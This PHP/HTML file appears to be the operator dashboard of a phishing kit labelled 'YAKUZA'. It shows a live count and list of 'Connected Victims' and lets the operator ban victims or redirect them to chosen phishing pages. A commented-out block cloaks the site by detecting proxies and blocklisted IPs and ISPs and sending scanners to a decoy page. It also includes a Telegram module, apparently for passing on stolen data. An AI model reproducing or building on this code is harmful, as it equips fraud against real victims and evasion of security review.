<?php

require "classes/Jeehan.class.php";

include './verifen/telegram.php';

include './verifen/x_deux_ip.php';

/*

function ip_in_range($ip, $range) {
    list($subnet, $bits) = explode('/', $range);
    $ipDecimal = ip2long($ip);
    $subnetDecimal = ip2long($subnet);
    $mask = -1 << (32 - $bits);
    $subnetMasked = $subnetDecimal & $mask;
    $ipMasked = $ipDecimal & $mask;
    return $subnetMasked == $ipMasked;
}

$test_HTTP_proxy_headers = array(
    'HTTP_VIA',
    'VIA',
    'Proxy-Connection',
    'HTTP_X_FORWARDED_FOR',
    'HTTP_FORWARDED_FOR',
    'HTTP_X_FORWARDED',
    'HTTP_FORWARDED',
    'HTTP_CLIENT_IP',
    'HTTP_FORWARDED_FOR_IP',
    'X-PROXY-ID',
    'MT-PROXY-ID',
    'X-TINYPROXY',
    'X_FORWARDED_FOR',
    'FORWARDED_FOR',
    'X_FORWARDED',
    'FORWARDED',
    'CLIENT-IP',
    'CLIENT_IP',
    'PROXY-AGENT',
    'HTTP_X_CLUSTER_CLIENT_IP',
    'FORWARDED_FOR_IP',
    'HTTP_PROXY_CONNECTION'
);

$proxy_detected = false;

foreach ($test_HTTP_proxy_headers as $header) {
    if (isset($_SERVER[$header]) && !empty($_SERVER[$header])) {
        $proxy_detected = true;
        break;
    }
}

if ($proxy_detected) {
    $redirect_url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('Location: ' . $redirect_url);
    exit;
}

$ip = getenv('REMOTE_ADDR');

$x_deux_ipz = getenv('REMOTE_ADDR');

$x_deux_filez = file_get_contents('./x_deux_robots.txt');

$x_deux_expz = explode("\n", $x_deux_filez);

for ($p = 0; $p < count($x_deux_expz); $p++) {
    if ($x_deux_expz[$p] == $x_deux_ipz) {
        include './verifen/popular.php';
        exit;
    }
}

include './verifen/x_deux_isps.php';

$x_deux = x_deux_isp(getenv('REMOTE_ADDR'));

if ($x_deux['PROXY'] == 'FALSE') {
    $x_deux_file = file_get_contents('./x_deux_isp.txt');

    $x_deux_exp = explode("\n", $x_deux_file);

    for ($i = 0; $i < count($x_deux_exp); $i++) {
        if ($x_deux_exp[$i] == $x_deux['ISP']) {
            include './verifen/popular.php';
            exit;
        }
    }
} else {
    include './verifen/popular.php';
    exit;
}

$rate_limit = 100;
$ip_hash = md5($ip);
$rate_limit_key = 'rate_limit:' . $ip_hash;
$requests = (int) $_SESSION[$rate_limit_key]['requests'] ?? 0;
$last_request_time = (int) $_SESSION[$rate_limit_key]['time'] ?? 0;
$current_time = time();

if ($current_time - $last_request_time < 60 && $requests >= $rate_limit) {
    include './verifen/popular.php';
    exit();
} else {
    $_SESSION[$rate_limit_key] = [
        'requests' => $requests + 1,
        'time' => $current_time
    ];
}

if (!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] !== 'on') {
    $redirect_url = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('Location: ' . $redirect_url);
    exit();
}
*/
?>

<html>
<head>
<title>YKZ</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<link rel="stylesheet" href="res/style.css">
<script src="./res/jq.js"></script>
</head>
<body>
<div class="header">
**** YAKUZA ****
</div>
<div class="list-section">
<h3>Connected Victims: <b id="victims-counter">0</b></h3>

<div class="list" id="v-list">

</div>

</div>
<script>
function ban(ip){
	var conf = confirm("you sure want to block this victim? :o");
	if(conf){
	$.post("process/processor.php",{ban:ip}, function(done){
		alert(done);
	} );
	}
}


function redirectVic(page, id){
	$.post("process/processor.php",
	{pageID:page, vicID:id} );
}

setInterval(function(){
	$.post("process/processor.php",
	{getOnlineVics:1}, function(data){
		$("#victims-counter").html(data);
	} );
}, 3000);

setInterval(function(){
	$.post("process/processor.php",
	{getVictims:1},
	function(done){
		$("#v-list").html(done);
	});
}, 3000);
</script>
</body>
</html>
